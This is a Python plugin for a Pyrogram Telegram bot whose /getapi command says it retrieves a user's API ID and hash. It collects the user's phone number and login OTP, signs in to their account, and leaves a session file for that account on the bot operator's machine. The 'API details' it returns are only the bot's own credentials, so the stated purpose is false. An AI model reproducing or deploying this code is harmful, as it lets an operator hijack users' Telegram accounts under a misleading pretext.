import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from SONALI import app  # Import your existing bot instance

user_sessions = {}  # Store user login data

@app.on_message(filters.command("getapi") & filters.private)
async def get_api(client, message: Message):
    user_id = message.chat.id
    phone_number = None
    
    await message.reply("📲 **Send your phone number to login (with country code).**")
    
    async with Client(f"session_{user_id}", api_id=app.api_id, api_hash=app.api_hash) as user_client:
        try:
            phone_message = await client.listen(user_id, timeout=60)  # Wait for user input
            phone_number = phone_message.text

            # Send OTP
            sent_code = await user_client.send_code(phone_number)
            await message.reply("🔢 **Enter the OTP sent to your Telegram.**")
            
            otp_message = await client.listen(user_id, timeout=60)
            otp_code = otp_message.text.strip()

            # Login using OTP
            await user_client.sign_in(phone_number, sent_code.phone_code_hash, otp_code)
            
            # Extract API ID & API Hash
            user_api_id = user_client.api_id
            user_api_hash = user_client.api_hash

            await message.reply(f"✅ **Your API Details:**\n\n📌 **API ID:** `{user_api_id}`\n🔑 **API Hash:** `{user_api_hash}`\n\n⚠️ **Keep these safe!**")
        except Exception as e:
            await message.reply(f"❌ **Error:** {e}")
